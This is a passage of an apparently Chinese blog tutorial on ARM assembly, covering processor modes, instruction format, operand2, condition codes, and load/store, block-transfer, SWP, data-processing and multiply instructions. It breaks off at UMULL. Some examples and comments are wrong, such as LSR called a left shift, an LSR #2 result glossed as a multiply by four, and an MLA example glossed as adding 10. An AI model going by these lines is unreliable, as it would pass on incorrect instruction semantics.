alt="register"></p><p>CPSR寄存器</p><p>FIQ和IRQ的区别？</p><table><thead><tr><th>MODE(以下为二进制)</th><th></th><th>可见的ARM状态寄存器</th></tr></thead><tbody><tr><td>10000</td><td>用户模式</td><td>PC,CPSR,R0~R14</td></tr><tr><td>10001</td><td>FIQ</td><td>PC,CPSR,SPSR_fiq，R14_fiq~R8_fiq,R7~R0</td></tr><tr><td>10010</td><td>IRQ</td><td>PC,CPSR,SPSR_irq，R14_irq~R13_irq,R12~R0</td></tr><tr><td>10011</td><td>管理模式(svc)</td><td>PC,CPSR,SPSR_svc，R14_svc~R13_svc,R12~R0</td></tr><tr><td>10111</td><td>终止模式</td><td>PC,CPSR,SPSR_abt，R14_abt~R13_abt,R12~R0</td></tr><tr><td>11011</td><td>未定义</td><td>PC,CPSR,SPSR_und，R14_und~R13_und,R2~R0</td></tr><tr><td>11111</td><td>系统模式(sys)</td><td>PC,CPSR，R14 ~R0</td></tr></tbody></table><h2 id="1-2-指令格式"><a href="#1-2-指令格式" class="headerlink" title="1.2.    指令格式"></a>1.2.    指令格式</h2><p>1) 基本格式</p><p>​    <code>&lt;opcode&gt;{&lt;cond&gt;}{S} &lt;Rd&gt;,&lt;Rn&gt;{,&lt;opcode2&gt;}</code></p><p>​       其中，&lt;&gt;内的项是必须的，{}内的项是可选的，如<opcode>是指令助记符，是必须的，而{<cond>}为指令执行条件，是可选的，如果不写则使用默认条件AL(无条件执行)。</cond></opcode></p><p>​       opcode  指令助记符，如LDR，STR 等</p><p>​       cond  执行条件，如EQ，NE 等</p><p>​       S  是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响</p><p>​       Rd  目标寄存器</p><p>​       Rn  第一个操作数的寄存器</p><p>​       operand2  第二个操作数</p><p>​       指令格式举例如下：</p><p>​         LDREX–这条指令主要是从memory中取一个数，然后放到register中，但是相比普通的LDR指令，在于其内在的原子操作特性, 信号量和spin lock这些东西最核心的事情基本上就是load-update-store序列，为了防止并发，必须保证这个序列是原子的，所谓原子，即处理器在执行这个指令序列时，得绝对占有处理器而不能够被切换出去。在ARM上，从V6开始，指令LDREX和STREX就是用来干这事的</p><p>​       LDR R0,[R1] ;读取R1 地址上的存储器单元内容，执行条件AL<br>​        BEQ DATAEVEN ;跳转指令，执行条件EQ，即相等跳转到DATAEVEN<br>​        ADDS R1,R1,#1 ;加法指令，R1＋1＝R1 影响CPSR 寄存器，带有S<br>​        SUBNES R1,R1,#0xD;条件执行减法运算(NE)，R1-0xD=&gt;R1，影响CPSR 寄存器，带有S</p><p>2) 第2个操作数</p><p>​        在ARM 指令中，灵活的使用第2个操作数能提高代码效率，第2个操作数的形式如下：</p><p>​        ＃immed_8r</p><p>​       常数表达式：</p><p>​         该常数必须对应8 位位图，即常数是由一个8 位的常数循环移位偶数位得到。</p><p>​        合法常量：</p><p>​       0x3FC、0、0xF0000000、200、0xF0000001等都是合法常量。</p><p>​       非法常量：</p><p>​       0x1FE、511、0xFFFF、0x1010、0xF0000010等都是非法常量。</p><p>​        常数表达式应用举例如下：</p><p>​       <code>MOV R0,#1 ;R0=1</code></p><p>​       <code>AND R1,R2,#0x0F ;</code>R2 与0x0F，结果保存在R1</p><p>​       <code>LDR R0，[R1],#-4 ;</code>读取R1 地址上的存储器单元内容，且R1＝R1－4</p><p>​       Rm</p><p>​        寄存器方式，在寄存器方式下操作数即为寄存器的数值。</p><p>​        寄存器方式应用举例：</p><p>​       <code>SUB R1，R1，R2 ；R1-R2=＞R1</code></p><p>​       <code>MOV PC，R0 ；</code>PC=R0，程序跳转到指定地址</p><p>​       <code>LDR R0，[R1]，-R2 ；</code>读取R1 地址上的存储器单元内容并存入R0，且R1=R1-R2</p><p>​       Rm， shift</p><p>​        寄存器移位方式。将寄存器的移位结果作为操作数，但RM 值保存不变，移位方法如下：</p><p>​       ASR #n  算术右移n 位（1≤n≤32）</p><p>​       LSL #n  逻辑左移n 位（1≤n≤31）</p><p>​       LSR #n  逻辑左移n 位（1≤n≤32）</p><p>​       ROR #n  循环右移n 位（1≤n≤31）</p><p>​       RRX  带扩展的循环右移1位</p><p>​       type Rs  其中，type 为ASR，LSL，和ROR 中的一种；Rs 偏移量寄存器，低8位有效，若其值大于或等于32，则第2 个操作数的结果为0（ASR、ROR例外）。<br>​        寄存器偏移方式应用举例：</p><p>​       ADD R1，R1，R1，LSL #3 ；R1=R1*9</p><p>​       SUB R1，R1，R2，LSR#2 ；R1=R1-R2*4</p><p>​       R15 为处理器的程序计数器PC，一般不要对其进行操作，而且有些指令是不允许使用R15，如UMULL 指令。<br>​        （3）条件码<br>​        使用指令条件码，可实现高效的逻辑操作，提高代码效率。表A-1给出条件码表。</p><p>表A-1  条件码表</p><p>​        对于Thumb指令集，只有B 指令具有条件码执行功能，此指令条件码同表A-?，但如果为无条件执行时，条件码助记符“AL”不在指令中书写。</p><p>​        条件码应用举例如下：</p><p>​        比较两个值大小，并进行相应加1 处理，C 代码为：<br>​        if（a＞b）a++       ;<br>​        else b++           ;<br>​        对应的ARM 指令如下。其中R0为a，R1为b。<br>​        CMP R0，R1        ; R0 与R1 比较<br>​        ADDHI R0，R0，#1        ; 若R0＞R1，则R0=R0+1<br>​        ADDLS R1，R1，#1        ;若R0＜=R1，则R1=R1+1<br>​        若两个条件均成立，则将这两个数值相加，C代码为：</p><p>​        If(（a!=10）&amp;&amp;(b!=20))a=a+b;</p><p>​        对应的ARM 指令如下，其中R0 为a，R1为b。<br>​        CMP R0,#10            ; 比较R0 是否为10<br>​        CMPNE R1,#20        ; 若R0 不为10，则比较R1 是否20<br>​        ADDNE R0,R0,R1        ; 若R0 不为10 且R1 不为20，指令执行，R0=R0+R1</p><h2 id="1-3-指令集"><a href="#1-3-指令集" class="headerlink" title="1.3.    指令集"></a>1.3.    指令集</h2><h3 id="1-3-1-ARM-存储器访问指令"><a href="#1-3-1-ARM-存储器访问指令" class="headerlink" title="1.3.1.   ARM 存储器访问指令"></a>1.3.1.   ARM 存储器访问指令</h3><p>​        ARM 处理是加载/存储体系结构的典型的RISC处理器，对存储器的访问只能使用加载和存储指令实现。ARM 的加载/存储指令是可以实现字、半字、无符/有符字节操作；批量加载/存储指令可实现一条指令加载/存储多个寄存器的内容，大大提高效率；SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等。ARM 处理器是冯?诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载/存储指令进行。表A-2给出ARM存储访问指令表。</p><p>表A-2  ARM 存储访问指令表</p><p><img src="https://magic-king.net/images/loading.gif" data-original="ARM/arm储存访问指令表.JPG" alt="img"></p><h4 id="LDR-和STR"><a href="#LDR-和STR" class="headerlink" title="LDR 和STR"></a><strong>LDR 和STR</strong></h4><p>​    加载/存储字和无符号字节指令。使用单一数据传送指令(STR 和LDR)来装载和存储单一字节或字的数据从/到内存。LDR指令用于从内存中读取数据放入寄存器中；STR 指令用于将寄存器中的数据保存到内存。指令格式如下：<br>​    <code>LDR{cond}{T} Rd,&lt;地址&gt;;</code>    加载指定地址上的数据(字)，放入Rd中<br>​    <code>STR{cond}{T} Rd,&lt;地址&gt;;</code>    存储数据(字)到指定地址的存储单元，要存储的数据在Rd中<br>​    <code>LDR{cond}B{T} Rd,&lt;地址&gt;;</code>  加载字节数据，放入Rd中，即Rd最低字节有效，高24位清零<br>​    <code>STR{cond}B{T} Rd,&lt;地址&gt;;</code>  存储字节数据，要存储的数据在Rd，最低字节有效<br>​    其中，T 为可选后缀，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下。T在用户模式下无效，不能与前索引偏移一起使用T。<br>​    LDR/STR 指令寻址是非常灵活的，由两部分组成，一部分为一个基址寄存器，可以为任一个通用寄存器，另一部分为一个地址偏移量。地址偏移量有以下3种格式：<br>​    (1) 立即数。立即数可以是一个无符号数值，这个数据可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：<br>​    <code>LDR R1,[R0,#0x12] ;</code>将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变)<br>​    <code>LDR R1,[R0,#-0x12];</code>将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变)<br>​    <code>LDR R1,[R0] ;</code>将R0 地址处的数据读出，保存到R1 中(零偏移)<br>​    (2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下：<br>​    <code>LDR R1,[R0,R2] ;</code>将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变)<br>​    <code>LDR R1,[R0,-R2] ;</code>将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变)<br>​    (3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：<br>​    <code>LDR R1,[R0,R2,LSL #2] ;</code>将R0+R2<em>4地址处的数据读出，保存到R1中（R0，R2的值不变）<br>​    <code>LDR R1,[R0,-R2,LSL #2];</code>将R0-R2</em>4地址处的数据计读出，保存到R1中(R0，R2的值不变)<br>​    从寻址方式的地址计算方法分，加载/存储指令有以下4 种形式：<br>​    (1)零偏移。Rn 的值作为传送数据的地址，即地址偏移量为0。指令举例如下：<br>​    <code>LDR Rd,[Rn]</code><br>​    (2)前索引偏移。在数据传送之前，将偏移量加到Rn 中，其结果作为传送数据的存储地址。若使用后缀“！”，则结果写回到Rn中，且Rn 值不允许为R15。指令举例如下：<br>​    <code>LDR Rd,[Rn,#0x04]!</code><br>​    <code>LDR Rd,[Rn,#-0x04]</code><br>​    (3)程序相对偏移。程序相对偏移是索引形式的另一个版本。汇编器由PC 寄存器计算偏移量，并将PC寄存器作为Rn 生成前索引指令。不能使用后缀“！”。指令举例如下：<br>​    <code>LDR Rd,label ;</code>label 为程序标号，label 必须是在当前指令的±4KB范围内<br>​    (4) 后索引偏移。Rn 的值用做传送数据的存储地址。在数据传送后，将偏移量与Rn相加，结果写回到Rn中。Rn 不允许是R15。指令举例如下：<br>​    <code>LDR Rd,[Rn],#0x04</code><br>​    地址对准–大多数情况下，必须保证用于32 位传送的地址是32 位对准的。<br>​    加载/存储字和无符号字节指令举例如下：<br>​    <code>LDR R2,[R5] ;</code>加载R5 指定地址上的数据(字)，放入R2 中<br>​    <code>STR R1,[R0,#0x04] ;</code>将R1 的数据存储到R0+0x04存储单元，R0 值不变<br>​    <code>LDRB R3,[R2],#1 ;</code>读取R2 地址上的一字节数据，并保存到R3中，R2=R3+1<br>​    <code>STRB R6,[R7] ;</code>读R6 的数据保存到R7 指定的地址中，只存储一字节数据<br>​    加载/存储半字和带符号字节。这类LDR/STR 指令可能加载带符字节\加载带符号半字、加载/存储无符号半字。偏移量格式、寻址方式与加载/存储字和无符号字节指令相同。指令格式如下：<br>​    <code>LDR{cond}SB Rd,&lt;地址&gt; ;</code>加载指定地址上的数据(带符号字节)，放入Rd中<br>​    <code>LDR{cond}SH Rd,&lt;地址&gt; ;</code>加载指定地址上的数据(带符号字节)，放入Rd中<br>​    <code>LDR{cond}H Rd,&lt;地址&gt; ;</code>加载半字数据，放入Rd中，即Rd最低16位有效,高16位清零<br>​    <code>STR{cond}H Rd,&lt;地址&gt; ;</code>存储半字数据，要存储的数据在Rd，最低16位有效<br>​    说明：带符号位半字/字节加载是指带符号位加载扩展到32 位;无符号位半字加载是指零扩展到32位。<br>​    地址对准–对半字传送的地址必须为偶数。非半字对准的半字加载将使Rd 内容不可靠，非半字对准的半字存储将使指定地址的2字节存储内容不可靠。</p><p>​        加载/存储半字和带符号字节指令举例如下：</p><p>​       <code>LDRSB R1[R0,R3] ;</code>将R0+R3地址上的字节数据读出到R1，高24 位用符号位扩展<br>​        <code>LDRSH R1,[R9] ;</code>将R9 地址上的半字数据读出到R1，高16位用符号位扩展<br>​        <code>LDRH R6,[R2],#2 ;</code>将R2 地址上的半字数据读出到R6，高16位用零扩展，R2=R2+1<br>​       <code>SHRH R1,[R0,#2]!;</code>将R1 的数据保存到R2+2 地址中，只存储低2字节数据，R0=R0+2<br>​        LDR/STR 指令用于对内存变量的访问，内存缓冲区数据的访问、查表、外设的控制操作等等，若使用LDR 指令加载数据到PC 寄存器，则实现程序跳转功能，这样也就实现了程序散转。<br>​        变量的访问<br>​        NumCount EQU 0x40003000 ;定义变量NumCount<br>​        …<br>​        LDR R0,=NumCount ;使用LDR 伪指令装载NumCount的地址到R0<br>​        LDR R1,[R0] ;取出变量值<br>​        ADD R1,R1,#1 ;NumCount=NumCount+1<br>​        STR R1,[R0] ;保存变量值<br>​        …<br>​        GPIO 设置<br>​        GPIO-BASE EQU 0Xe0028000 ;定义GPIO 寄存器的基地址<br>​        …<br>​        LDR R0,=GPIO-BASE<br>​        LDR R1,=0x00FFFF00 ;装载32 位立即数，即设置值<br>​        STR R1,[R0,#0x0C] ;IODIR=0x00FFFF00， IODIR 的地址为0xE002800C<br>​        MOV R1,#0x00F00000<br>​        STR R1,[R0,#0x04] ;IOSET=0x00F00000，IOSET 的地址为0xE0028004<br>​        …<br>​        程序散转<br>​        …<br>​        MOV R2,R2,LSL #2 ;功能号乘上4，以便查表<br>​        LDR PC,[PC,R2] ;查表取得对应功能子程序地址，并跳转<br>​        NOP<br>​        FUN-TAB DCD FUN-SUB0<br>​        DCD FUN-SUB1<br>​        DCD FUN-SUB2<br>​        …</p><h4 id="LDM和STM"><a href="#LDM和STM" class="headerlink" title="LDM和STM"></a><strong>LDM和STM</strong></h4><p>​        批量加载/存储指令可以实现在一组寄存器和一块连续的内存单元之间传输数据。LDM为加载多个寄存器，STM 为存储多个寄存器。允许一条指令传送16 个寄存器的任何子集或所有寄存器。指令格式如下：<br>​        <code>LDM{cond}&lt;模式&gt; Rn{!},reglist{^}</code><br>​        <code>STM{cond}&lt;模式&gt; Rn{!},reglist{^}</code><br>​        LDM /STM 的主要用途是现场保护、数据复制、参数传送等。其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作)。<br>​        (1) IA：每次传送后地址加4<br>​        (2) IB：每次传送前地址加4<br>​        (3) DA：每次传送后地址减4<br>​        (4) DB：每次传送前地址减4<br>​        (5) FD：满递减堆栈<br>​        (6) ED：空递增堆栈<br>​        (7) FA：满递增堆栈<br>​        (8) EA：空递增堆栈<br>​        其中，寄存器Rn 为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15;后缀“！”表示最后的地址写回到Rn中;寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9},寄存器排列由小到大排列；“＾”后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回；使用“＾”后缀进行数据传送且寄存器列表不包含PC时，加载/存储的是用户模式的寄存器，而不是当前模式的寄存器。<br>​        地址对准――这些指令忽略地址的位[1：0]。<br>​        批量加载/存储指令举例如下：<br>​        <code>LDMIA R0!,{R3-R9} ;</code>加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新<br>​        <code>STMIA R1!,{R3-R9} ;</code>将R3～R9 的数据存储到R1 指向的地址上，R1值更新<br>​        <code>STMFD SP!,{R0-R7,LR} ;</code>现场保存，将R0～R7、LR入栈<br>​        <code>LDMFD SP!,{R0-R7,PC}^;</code>恢复现场，异常处理返回<br>​        在进行数据复制时，先设置好源数据指针，然后使用块拷贝寻址指令LDMIA/STMIA、LDMIB/STMIB、LDMDA/STMDA、LDMDB/STMDB 进行读取和存储。而进行堆栈操作时，则要先设置堆栈指针，一般使用SP 然后使用堆栈寻址指令STMFD/LDMFD、STMED。LDMED、STMFA/LDMFA、STMEA/LDMEA实现堆栈操作。<br>​        多寄存器传送指令示意图如图A-1所示，其中R1为指令执行前的基址寄存器，R1’则为指令执行完后的基址寄存器。</p><p>（a）指令STMIA R1!,{R5-R7}                                （b）指令STMIB R1!,{R5-R7}</p><p>（c）指令STMDA R1!, {R5-R7}                                （d）指令STMDB R1!,{R5-R7}<br>图A-1  多寄存器传送指令示意图</p><p>​        数据是存储在基址寄存器的地址之上还是之下，地址是在存储第一个值之前还是之后增加还是减少。表A-3给出多寄存器传送指令映射示意表。</p><p>表A-3  多寄存器传送指令映射示意表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用LDM/STM 进行数据复制例程如下：</span><br><span class="line">…</span><br><span class="line">LDR R0,=SrcData ;//设置源数据地址</span><br><span class="line">LDR R1,=DstData ;//设置目标地址</span><br><span class="line">LDMIA R0,&#123;R2-R9&#125; ;//加载8 字数据到寄存器R2～R9</span><br><span class="line">STMIA R1,&#123;R2-R9&#125; ;//存储寄存器R2～R9 到目标地址</span><br></pre></td></tr></table></figure><p>​        使用LDM/STM 进行现场寄存器保护，常在子程序中或异常处理使用：<br>​        SENDBYTE<br>​        STMFD SP!,{R0-R7,LR} ;寄存器入堆<br>​        …<br>​        BL DELAY ;调用DELAY 子程序<br>​        …<br>​        LDMFD SP!,{R0-R7,PC} ;恢复寄存器，并返回</p><h4 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a><strong>SWP</strong></h4><p>​        寄存器和存储器交换指令。SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中。使用SWP 可实现信号量操作。<br>​        指令格式如下：<br>​       <code>SWP{cond}{B} Rd,Rm,[Rn]</code><br>​        其中，B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同。<br>​        SWP 指令举例如下：<br>​        SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换<br>​        SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零)<br>​                                       ; 并将R2 的内容写入到该内存单元中(最低字节有效)<br>​        使用SWP 指令可以方便地进行信号量的操作：<br>​        12C_SEM EQU 0x40003000<br>​        …<br>​        12C_SEM_WAIT<br>​        MOV R0,#0<br>​        LDR R0,=12C_SEM<br>​        SWP R1,R1,[R0]        ;取出信号量，并设置其为0<br>​        CMP R1,#0            ;判断是否有信号<br>​        BEQ 12C_SEM_WAIT      ;若没有信号，则等待</p><h3 id="1-3-2-ARM-数据处理指令"><a href="#1-3-2-ARM-数据处理指令" class="headerlink" title="1.3.2.   ARM 数据处理指令"></a>1.3.2.   ARM 数据处理指令</h3><p>​        数据处理指令大致可分为3 类：</p><p>（1）     数据传送指令（如MOV、MVN）</p><p>（2）     算术逻辑运算指令（如ADD,SUM,AND）</p><p>（3）     比较指令（如CMP、TST）。</p><p>数据处理指令只能对寄存器的内容进行操作。        所有ARM 数据处理指令均可选择使用S 后缀，以影响状态标志。比较指令CMP、CMN、TST和TEQ不需要后缀S，它们会直接影响状态标志。ARM数据处理指令列于表A-4中。</p><p>表A-4  ARM 数据处理指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> （1）数据传送指令</span><br><span class="line">**MOV**</span><br><span class="line"> 数据传送指令。将8 位图立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作。指令格式如下：</span><br><span class="line"> MOV&#123;cond&#125;&#123;S&#125; Rd,operand2</span><br><span class="line"> MOV 指令举例如下：</span><br><span class="line"> MOV R1#0x10 ;R1=0x10</span><br><span class="line"> MOV R0,R1 ;R0=R1</span><br><span class="line"> MOVS R3,R1,LSL #2 ;R3=R1＜＜2，并影响标志位</span><br><span class="line"> MOV PC,LR   ;PC=LR ，子程序返回</span><br></pre></td></tr></table></figure><h4 id="MVN"><a href="#MVN" class="headerlink" title="MVN"></a><strong>MVN</strong></h4><p>​        数据非传送指令。将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数。指令格式如下：<br>​        <code>MVN{cond}{S} Rd,operand2</code><br>​        MVN 指令举例如下：<br>​        MVN R1,#0xFF ;R1=0xFFFFFF00<br>​        MVN R1,R2 ;将R2 取反，结果存到R1</p><p>​        （2）算术逻辑运算指令</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a><strong>ADD</strong></h4><p>​        加法运算指令。将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器。指令格式如下：<br>​        <code>ADD{cond}{S} Rd,Rn,operand2</code><br>​        ADD 指令举例如下：<br>​        ADDS R1,R1,#1 ;R1=R1+1<br>​        ADD R1,R1,R2 ;R1=R1+R2<br>​        ADDS R3,R1,R2,LSL #2 ;R3=R1+R2＜＜2</p><h4 id="SUB"><a href="#SUB" class="headerlink" title="SUB"></a><strong>SUB</strong></h4><p>​        减法运算指令。用寄存器Rn 减去operand2。结果保存到Rd 中。指令格式如下：<br>​        <code>SUB{cond}{S} Rd,Rn,operand2</code><br>​        SUB 指令举例如下：<br>​        SUBS R0,R0,#1 ;R0=R0-1<br>​        SUBS R2,R1,R2 ;R2=R1-R2<br>​        SUB R6,R7,#0x10 ;R6=R7-0x10</p><h4 id="RSB"><a href="#RSB" class="headerlink" title="RSB"></a><strong>RSB</strong></h4><p>​        逆向减法指令。用寄存器operand2 减法Rn，结果保存到Rd 中。指令格式如下：<br>​        <code>RSB{cond}{S} Rd,Rn,operand2</code><br>​        SUB 指令举例如下：<br>​        RSB R3,R1,#0xFF00 ;R3=0xFF00-R1<br>​        RSBS R1,R2,R2,LSL #2 ;R1=R2＜＜2-R2=R2×3<br>​        RSB R0,R1,#0 ;R0=-R1</p><h4 id="ADC"><a href="#ADC" class="headerlink" title="ADC"></a><strong>ADC</strong></h4><p>​        带进位加法指令。将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位。结果保存到Rd 寄存器。指令格式如下：<br>​        <code>ADC{cond}{S} Rd,Rn,operand2</code><br>​        ADC 指令举例如下：<br>​        ADDS R0,R0,R2<br>​        ADC R1,R1,R3 ;使用ADC 实现64 位加法，(R1、R0)=(R1、R0)+（R3、R2）</p><h4 id="SBC"><a href="#SBC" class="headerlink" title="SBC"></a><strong>SBC</strong></h4><p>​        带进位减法指令。用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中。指令格式如下：<br>​       <code>SCB{cond}{S}Rd,Rn,operand2</code><br>​        SBC 指令举例如下：<br>​        SUBS R0，R0，R2<br>​        SBC R1，R1，R3 ;使用SBC 实现64 位减法，(R1,R0)-(R3,R2)</p><h4 id="RSC"><a href="#RSC" class="headerlink" title="RSC"></a><strong>RSC</strong></h4><p>​        带进位逆向减法指令。用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中。指令格式如下：<br>​       <code>RSC{cond}{S} Rd,Rn,operand2</code><br>​        RSC 指令举例如下：<br>​        RSBS R2,R0,#0<br>​        RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数</p><h4 id="AND"><a href="#AND" class="headerlink" title="AND"></a><strong>AND</strong></h4><p>​        逻辑与操作指令。将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中。指令格式如下：<br>​        <code>AND{cond}{S} Rd,Rn,operand2</code><br>​        AND 指令举例如下：<br>​        ANDS R0,R0,#x01 ;R0=R0&amp;0x01，取出最低位数据<br>​        AND R2,R1,R3 ;R2=R1&amp;R3</p><h4 id="ORR"><a href="#ORR" class="headerlink" title="ORR"></a><strong>ORR</strong></h4><p>​        逻辑或操作指令。将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中。指令格式如下：<br>​        <code>ORR{cond}{S} Rd,Rn,operand2</code><br>​        ORR 指令举例如下：<br>​        ORR R0,R0,#x0F ;将R0 的低4 位置1<br>​        MOV R1,R2,LSR #4<br>​        ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中</p><h4 id="EOR"><a href="#EOR" class="headerlink" title="EOR"></a><strong>EOR</strong></h4><p>​        逻辑异或操作指令。将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中。指令格式如下：<br>​        <code>EOR{cond}{S}Rd,Rn,operand2</code><br>​        EOR 指令举例如下：<br>​        EOR R1,R1,#0x0F ;将R1 的低4 位取反<br>​        EOR R2,R1,R0 ;R2=R1^R0<br>​        EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位</p><h4 id="BIC"><a href="#BIC" class="headerlink" title="BIC"></a><strong>BIC</strong></h4><p>​        位清除指令。将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。指令格式如下：<br>​        <code>BIC{cond}{S}Rd,Rn,operand2</code><br>​        BIC 指令举例如下：<br>​        BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变<br>​        BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1</p><p>​        （3）比较指令</p><h4 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a><strong>CMP</strong></h4><p>​        比较指令。指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：<br>​        <code>CMP{cond} Rn,operand2</code><br>​        CMP 指令举例如下：<br>​        CMP R1,#10 ;R1 与10 比较，设置相关标志位<br>​        CMP R1,R2 ;R1 与R2 比较，设置相关标志位<br>​        CMP 指令与SUBS 指令的区别在于CMP 指令不保存运算结果。在进行两个数据大小判断时，常用CMP指令及相应的条件码来操作。</p><h4 id="CMN"><a href="#CMN" class="headerlink" title="CMN"></a><strong>CMN</strong></h4><p>​        负数比较指令。指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行，指令格式如下：<br>​        <code>CMN{cond} Rn,operand2</code><br>​        CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位<br>​        CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。</p><h4 id="TST"><a href="#TST" class="headerlink" title="TST"></a><strong>TST</strong></h4><p>​        位<a href="http://lib.csdn.net/base/softwaretest" target="_blank" rel="noopener">测试</a>指令。指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行。指令格式如下：<br>​        <code>TST{cond} Rn,operand2</code><br>​        TST 指令举例如下：<br>​        TST R0,#0x01 ;判断R0 的最低位是否为0<br>​        TST R1,#0x0F ;判断R1 的低4 位是否为0<br>​        TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。</p><h4 id="TEQ"><a href="#TEQ" class="headerlink" title="TEQ"></a><strong>TEQ</strong></h4><p>​        相等测试指令。指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行。指令格式如下：<br>​        <code>TEQ{cond} Rn,operand2</code><br>​        TEQ 指令举例如下：<br>​        TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位)<br>​        TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。</p><p>（4）乘法指令<br>​        ARM7TDMI(-S)具有32×32 乘法指令、32×32 乘加指令、32×32结果为64 位的乘法指令。表A-5给出全部的ARM 乘法指令。</p><p>表A-5  全部的ARM 乘法指令</p><h4 id="MUL"><a href="#MUL" class="headerlink" title="MUL"></a><strong>MUL</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">32 位乘法指令。指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中。指令格式如下：</span><br><span class="line">MUL&#123;cond&#125;&#123;S&#125; Rd,Rm,Rs</span><br><span class="line">MUL 指令举例如下：</span><br><span class="line">MUL R1,R2,R3 ;R1=R2×R3</span><br><span class="line">MULS R0,R3,R7 ;R0=R3×R7，同时设置CPSR 中的N位和Z 位</span><br></pre></td></tr></table></figure><h4 id="MLA"><a href="#MLA" class="headerlink" title="MLA"></a><strong>MLA</strong></h4><p>​        32 位乘加指令。指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中。指令格式如下：<br>​        <code>MLA{cond}{S} Rd,Rm,Rs,Rn</code><br>​        MLA 指令举例如下：<br>​        MLA R1,R2,R3,R0 ;R1=R2×R3+10</p><h4 id="UMULL"><a href="#UMULL" class="headerlink" title="UMULL"></a><strong>UMULL</strong></h4><p>​        64 位无符号乘法指令。指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中。指令格式如下：<br>​        <code>UMULL{cond}{S} RdLo,RdHi,Rm,Rs</code><br>​        UMULL 